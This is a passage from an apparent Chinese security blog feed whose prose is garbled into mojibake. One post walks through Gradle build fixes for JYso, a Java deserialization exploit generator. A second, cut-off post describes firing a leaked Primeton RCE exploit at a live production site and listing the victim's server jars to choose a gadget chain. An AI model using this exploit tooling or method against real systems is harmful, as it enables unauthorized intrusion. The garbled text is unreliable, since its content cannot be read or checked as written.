operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">131</span>ms</code></pre><p>èµ°åˆ°è¿™æ—¶å€™æ˜¯ä¸æ˜¯æœ‰é©¬åœ¨å¿ƒä¸­å´©è…¾æˆ‘ä¹Ÿæ˜¯æ²ƒæ—¥ã€‚æˆ‘ä»¬å†·é™çœ‹çœ‹è¿˜æœ‰ä¸œè¥¿æ²¡æœ‰å¹²æ‰ã€‚libs.versions.toml<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011829490.png" alt="åœ¨æ³¨é‡Š"><br>åŒæ­¥ä¸€ä¸‹åˆæŠ¥é”™äº†ã€‚è¿™æ˜¯æˆ‘å°¼ç›æƒ³æ‘”é”®ç›˜äº†ã€‚ä½†æ˜¯è¿™æ—¶å€™ä»–å‘Šè¯‰æˆ‘ä»¬é‚£é‡Œæœ‰é—®é¢˜äº†ã€‚æ²¡é”™å°±æ˜¯\build.gradleâ€™ line: 37</p><pre class="language-java" data-language="java"><code class="language-java">FAILURE<span class="token operator">:</span> <span class="token class-name">Build</span> failed <span class="token keyword">with</span> <span class="token namespace">an</span> exception<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token class-name">Where</span><span class="token operator">:</span><span class="token class-name">Build</span> file '<span class="token class-name">C</span><span class="token operator">:</span>\<span class="token class-name">Users</span>\<span class="token class-name">Administrator</span>\<span class="token class-name">Desktop</span>\gradleproject\<span class="token class-name">JYso</span><span class="token operator">-</span>master\build<span class="token punctuation">.</span>gradle' line<span class="token operator">:</span> <span class="token number">37</span><span class="token operator">*</span> <span class="token class-name">What</span> went wrong<span class="token operator">:</span><span class="token class-name">A</span> problem occurred evaluating root project <span class="token char">'JYso'</span><span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">No</span> such property<span class="token operator">:</span> media <span class="token keyword">for</span> <span class="token keyword">class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>accessors<span class="token punctuation">.</span>dm<span class="token punctuation">.</span></span>LibrariesForLibs</span>$<span class="token class-name">JavaxLibraryAccessors</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">162</span>ms</code></pre><p>æˆ‘ä»¬çœ‹çœ‹37è¡Œæ˜¯æœ‰ä¸ªå•¥ã€‚ç›´æ¥æ³¨é‡Š<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011831067.png" alt="è¿™ä¸ªå¼æ¯›"><br>ç›´æ¥æ³¨é‡Šåœ¨åŒæ­¥</p><pre class="language-java" data-language="java"><code class="language-java">FAILURE<span class="token operator">:</span> <span class="token class-name">Build</span> failed <span class="token keyword">with</span> <span class="token namespace">an</span> exception<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token class-name">Where</span><span class="token operator">:</span><span class="token class-name">Build</span> file '<span class="token class-name">C</span><span class="token operator">:</span>\<span class="token class-name">Users</span>\<span class="token class-name">Administrator</span>\<span class="token class-name">Desktop</span>\gradleproject\<span class="token class-name">JYso</span><span class="token operator">-</span>master\build<span class="token punctuation">.</span>gradle' line<span class="token operator">:</span> <span class="token number">39</span><span class="token operator">*</span> <span class="token class-name">What</span> went wrong<span class="token operator">:</span><span class="token class-name">A</span> problem occurred evaluating root project <span class="token char">'JYso'</span><span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">No</span> such property<span class="token operator">:</span> oracle <span class="token keyword">for</span> <span class="token keyword">class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>accessors<span class="token punctuation">.</span>dm<span class="token punctuation">.</span></span>LibrariesForLibs</span>$<span class="token class-name">ComLibraryAccessors</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">426</span>ms</code></pre><p>åŒæ ·çš„æ‰‹æ®µåœ¨åŒæ­¥æˆ‘æ“çœ‹åˆ°build success äº†è¿™æ—¶å€™æ˜¯ä¸æ˜¯çœ¼æ³ªéƒ½è¦æµå‡ºæ¥äº†æ²ƒæ—¥ã€‚æˆ‘ä¹Ÿæ˜¯<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011833104.png" alt="æ²ƒæ—¥"><br>æˆ‘ä»¬ç‚¹å‡»build ç‚¹å‡»clean<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011834856.png" alt="æ¸…ç†"><br>ç„¶æˆ‘ä»¬ç‚¹å‡»jarã€‚æ¡æ“¦åˆæŠ¥é”™äº†ã€‚çœ‹æ ·å­æ˜¯æ‰¾ä¸åˆ°jdké‡Œé¢çš„java.exeæˆ‘ä»¬é…ç½®ä¸€ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011835902.png" alt="æŠ¥é”™äº†"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Execution</span> failed <span class="token keyword">for</span> task '<span class="token operator">:</span>compileJava'<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Error</span> <span class="token keyword">while</span> evaluating property 'javaCompiler' of task '<span class="token operator">:</span>compileJava'<span class="token punctuation">.</span>   <span class="token operator">></span> <span class="token class-name">Failed</span> <span class="token keyword">to</span> <span class="token namespace">calculate</span> the value of task '<span class="token operator">:</span>compileJava' property 'javaCompiler'<span class="token punctuation">.</span>      <span class="token operator">></span> <span class="token class-name">The</span> configured executable does not exist <span class="token punctuation">(</span><span class="token class-name">C</span><span class="token operator">:</span>\env\JAVA\jdk1<span class="token punctuation">.</span><span class="token number">8.0_402</span>\bin\javac<span class="token punctuation">.</span>exe<span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">Try</span><span class="token operator">:</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>stacktrace option <span class="token keyword">to</span> <span class="token namespace">get</span> the stack trace<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>info or <span class="token operator">--</span>debug option <span class="token keyword">to</span> <span class="token namespace">get</span> more log output<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Run</span> <span class="token keyword">with</span> <span class="token operator">--</span>scan <span class="token keyword">to</span> <span class="token namespace">get</span> full insights<span class="token punctuation">.</span><span class="token operator">></span> <span class="token class-name">Get</span> more help at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>help<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token punctuation">.</span>BUILD FAILED in <span class="token number">313</span>ms<span class="token number">1</span> actionable task<span class="token operator">:</span> <span class="token number">1</span> executed</code></pre><p>æˆ‘çš„æ˜¯è¿™ä¸ªè·¯å¾„ä½ ä»¬è‡ªå·±çœ‹è‡ªå·±çš„jdkè·¯å¾„ã€‚ç‚¹å‡»cleanç„¶åå†ç‚¹å‡»jar<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011837688.png" alt="é…ç½®jdkè·¯å¾„"><br>çœ‹åˆ°ä¸‹å›¾ä½ æ˜¯ä¸æ˜¯ä»¥ä¸ºæˆåŠŸäº†ã€‚æˆ‘ä»¬çœ‹çœ‹ç”Ÿæˆçš„jaråŒ…<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011839034.png" alt="å‡æˆåŠŸ"><br>è¿™ä¸€çœ‹å°±æ˜¯æ²¡æœ‰ä¾èµ–çš„jaræ²ƒæ—¥ã€‚é™·å…¥æ€€ç–‘äº†ã€‚ä¸ç€æ€¥ã€‚æˆ‘ä»¬åœ¨build.gradle<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011840301.png" alt="æ²¡æœ‰ä¾èµ–çš„jar"><br>çœ‹åˆ°è¿™ä¸ªsharjarå¹¶ä¸”æœ‰å…¥å£å‡½æ•°é‚£ä¼°è®¡å°±æ˜¯å®ƒäº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011842438.png" alt="å…¥å£å‡½æ•°"><br>æˆ‘ä»¬çœ‹åˆ°é‚£ä¸ªJysoæ˜¯çº¢è‰²æ„Ÿè§‰æœ‰ç‚¹å‘çˆ¹é‡æ–°é‡å¯ä¸€ä¸‹ideaè®©å®ƒé‡æ–°è¯†åˆ«ä¸€ä¸‹ã€‚å½“ç„¶ä¸é‡å¯ä¹Ÿè¡Œã€‚å¼ºè¿«ç—‡å¯èƒ½ä¼šé‡å¯ä¸€ä¸‹å“ˆå“ˆå“ˆã€‚å¹¶ä¸”æˆ‘ä»¬çœ‹åˆ°showjaräº†ã€‚æ²¡é”™å°±æ˜¯ç‚¹ä¸€æ³¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011845330.png" alt="é‡å¯äº†ä¸€ä¸‹æœç„¶æ²¡æœ‰çˆ†çº¢äº†"><br>æˆ‘æ“ç»ˆäºæˆåŠŸäº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011848294.png" alt="æˆåŠŸäº†"><br>æµ‹è¯•ä¸€ä¸‹<br>perfectå®Œç¾ã€‚å¦‚ä½•å¼ºåˆ¶ä½¿ç”¨ä¸€ä¸ªç‰¹å®šç‰ˆæœ¬jaråŒ…ç‰ˆæœ¬å†build.gradleé‡Œé¢åŠ å…¥.å¼ºåˆ¶ä½¿ç”¨ commons-beanutils 1.6.1 ç‰ˆæœ¬çš„jar</p><pre class="language-xml" data-language="xml"><code class="language-xml">implementation('commons-beanutils:commons-beanutils:1.6.1') &#123;     version &#123;         strictly '1.6.1'    &#125;&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011849362.png" alt="æˆåŠŸ"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p> libåŒ…å’Œç¼–è¯‘çš„ä¿®æ”¹çš„ä¸œè¥¿æˆ‘æ”¾åˆ°é¢‘é“äº†ã€‚å¹¶ä¸”å«æœ‰ç¼–è¯‘æˆåŠŸçš„ã€‚ä¸è¿‡ä½ç‰ˆæœ¬æ‰“ä¸äº†ä»£ç å­˜åœ¨é—®é¢˜ã€‚ä¸»è¦æ˜¯è®²è§£å¦‚ä½•ç¼–è¯‘åç»­ä½œè€…æ›´æ–°ä»¥åä½ ä»¬å¯ä»¥è‡ªå·±ç¼–è¯‘ã€‚<br/><br> <a href="https://t.me/SoftwareNoticeChannel/418">https://t.me/SoftwareNoticeChannel/418</a></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ™®å…ƒååºåˆ—åŒ–æ¼æ´å¤ç°æ¢ç©¶ä»¥åŠysoserialå„ç§å·¥å…·ç¼–è¯‘é‰´èµ</title>
      <link href="/penetrationtest/2024/04/articles/bf2db1aeff47d7f9/"/>
      <url>/penetrationtest/2024/04/articles/bf2db1aeff47d7f9/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´å¤ç°èƒŒæ™¯"><a href="#æ¼æ´å¤ç°èƒŒæ™¯" class="headerlink" title="æ¼æ´å¤ç°èƒŒæ™¯"></a>æ¼æ´å¤ç°èƒŒæ™¯</h2><p> å‰å‡ å¤©ç¿»å…¬ä¼—å·å¾®æ­¥å‘å¸ƒé€šå‘Š <a href="https://mp.weixin.qq.com/s/DutoC4yeO6_GrzhkZukV0Q">https://mp.weixin.qq.com/s/DutoC4yeO6_GrzhkZukV0Q</a> è¯´æ™®å…ƒå­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¿™æ—¶å€™æˆ‘çœ‹ç¾¤é‡Œå’ŒæŸäº›å°å¯†åœˆé‡Œé¢poc éƒ½æµå‡ºæ¥äº†ã€‚ä¸€çœ‹pocä¸€çœ‹å°±æ˜¯javaååºåˆ—åŒ–æ¼æ´ã€‚é‚£ä¹ˆè¯´åˆ°è¿™ä¸ªã€‚æˆ‘ä»¬éœ€è¦çŸ¥é“å¦‚ä½•æ„é€ ä½¿ç”¨å·¥å…·javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾ã€‚å¹¶ä¸”å¾—çŸ¥é“è¿™ä¸ªæ™®å…ƒçš„ç‰ˆæœ¬æ¼æ´çš„ç‰ˆæœ¬å·æ˜¯å¤šå°‘æˆ‘ä»¬æ‰å¯ä»¥è‡ªå®šä¹‰æˆ‘ä»¬çš„poc exp ã€‚ä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p><h2 id="ä½¿ç”¨åˆ«äººçš„expè¿›è¡Œæ”»å‡»"><a href="#ä½¿ç”¨åˆ«äººçš„expè¿›è¡Œæ”»å‡»" class="headerlink" title="ä½¿ç”¨åˆ«äººçš„expè¿›è¡Œæ”»å‡»"></a>ä½¿ç”¨åˆ«äººçš„expè¿›è¡Œæ”»å‡»</h2><p>æˆ‘ä»¬ä½¿ç”¨åˆ«äººçš„expæ‰“ä¸€ä¸‹ç¡®å®šæµ‹è¯•ç«™ã€‚æˆªå›¾å¦‚ä¸‹:ç”±äºä¸ºå®æˆ˜ç¯å¢ƒæ‰€ä»¥é“­æ„Ÿä¿¡æ¯éƒ½æ‰“ç ã€‚poc urlæˆ‘å°±ä¸æ‰“ç äº†ã€‚è¿™ä¸ªå½“ç„¶æ˜¯ä¹‹å‰çš„ä¸è¿‡éƒ½ä¸€æ ·ã€‚<strong>ä¸»è¦çš„æ˜¯é‡åˆ°javaååºåˆ—åŒ–,æˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°åˆ©ç”¨é“¾æ„é€ å±äºæˆ‘ä»¬è‡ªå·±çš„expã€‚è¿™æ˜¯å…³é”®</strong><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291656973.png" alt="åˆ«äººçš„expæµ‹è¯•"><br>é€šè¿‡ä¸Šé¢çš„expæˆ‘ä»¬ç¡®å®šè¿™ä¸ªç½‘ç«™å­˜åœ¨æ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ç¡®å®šé“¾çš„æˆ‘ä»¬çŸ¥é“javaååºåˆ—åŒ–æ¼æ´éœ€è¦ä¾èµ– jdkå’Œç¬¬ä¸‰æ–¹jaråŒ…ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±çœ‹çœ‹è¿™ä¸ªç½‘ç«™æœ‰å“ªäº›jarä¸å°±è¡Œäº†ã€‚<br>åˆ©ç”¨ä»–çš„pocå¸®åŠ©æˆ‘ä»¬æ‰¾jar ã€‚apache-tomcat-7.0.54\webapps\default\WEB-INF\lib  è‡³äºä¸ºå•¥æ˜¯è¿™ä¸ªè·¯å¾„è¿™å¾—éœ€è¦å¯¹javaé¡¹ç›®æ¯”è¾ƒç†Ÿæ‚‰ã€‚è¿™é‡Œæˆ‘å°±ä¸åšä»‹ç»äº†ã€‚å¤§å®¶å¯ä»¥è‡ªè¡Œè¡¥å……ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291702440.png" alt="jaråŒ…æˆªå›¾"><br>æˆ‘ä»¬æŠŠè¿™äº›jaråŒ…è¿‡æ»¤å‡ºæ¥æ‰¾æˆ‘ä»¬éœ€è¦çš„</p><pre class="language-java" data-language="java"><code class="language-java">activation<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jaralicloudcli<span class="token punctuation">.</span>jarant<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarantisamy<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jarantlr<span class="token operator">-</span><span class="token number">2.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jaraopalliance<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarasm<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jaraxiom<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jaraxiom<span class="token operator">-</span>dom<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jaraxiom<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jaraxis2<span class="token operator">-</span>adb<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jaraxis2<span class="token operator">-</span>codegen<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jaraxis2<span class="token operator">-</span>kernel<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarbackport<span class="token operator">-</span>util<span class="token operator">-</span>concurrent<span class="token operator">-</span><span class="token number">2.2</span><span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>anim<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>awt<span class="token operator">-</span>util<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>bridge<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>codec<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>css<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>css<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>dom<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>ext<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>extension<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>gui<span class="token operator">-</span>util<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>gvt<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>parser<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>script<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>svg<span class="token operator">-</span>dom<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>svggen<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>swing<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>transcoder<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>util<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>util<span class="token punctuation">.</span>jarbatik<span class="token operator">-</span>xml<span class="token punctuation">.</span>jarbcprov<span class="token operator">-</span>jdk15<span class="token operator">-</span><span class="token number">1.41</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbfs_client<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_client_eos<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_common<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_console<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_engineall<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbfs_interface<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jarbps<span class="token operator">-</span>integration<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbps<span class="token operator">-</span>server<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbps<span class="token operator">-</span>taglib4j<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarbps<span class="token operator">-</span>taskcenter<span class="token operator">-</span>adapter<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarc3p0<span class="token operator">-</span><span class="token number">0.9</span><span class="token number">.0</span><span class="token punctuation">.</span>jarcglib<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.3</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>control<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>bpff<span class="token punctuation">.</span>base<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>rest<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>retry<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>client<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ext<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>server<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcom<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rpf<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>beanutils<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>codec<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>codec<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>collections<span class="token operator">-</span><span class="token number">3.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>collections4<span class="token operator">-</span><span class="token number">4.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>compress<span class="token operator">-</span><span class="token number">1.12</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>configuration<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>dbcp<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>digester<span class="token operator">-</span><span class="token number">1.8</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>email<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>fileupload<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>fileupload<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>httpclient<span class="token operator">-</span><span class="token number">3.0</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>io<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>io<span class="token operator">-</span><span class="token number">1.4</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>jexl<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>jxpath<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>lang<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>logging<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.4</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>math<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>pool<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>pool<span class="token punctuation">.</span>jarcommons<span class="token operator">-</span>vfs<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jarcore4wl<span class="token punctuation">.</span>jarcos<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jardatalogic<span class="token punctuation">.</span>jardatastaxcli<span class="token punctuation">.</span>jardatetimeformat<span class="token punctuation">.</span>jardm<span class="token punctuation">.</span>jardmgraph<span class="token punctuation">.</span>jardm_report<span class="token punctuation">.</span>jardom4j<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jarecj<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jareigenbase<span class="token operator">-</span>properties<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jareigenbase<span class="token operator">-</span>resgen<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jareigenbase<span class="token operator">-</span>xom<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>access<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>access<span class="token operator">-</span>ejb<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>common<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>das<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>data<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>engine<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>runtime<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>sca<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>spring<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jareos<span class="token operator">-</span>server<span class="token operator">-</span>system<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar<span class="token class-name">EOS3Encode</span><span class="token punctuation">.</span>jarexcel2007<span class="token punctuation">.</span>jarexcelcli<span class="token punctuation">.</span>jarfastjson<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jarfileupload<span class="token operator">-</span>progress<span class="token operator">-</span><span class="token 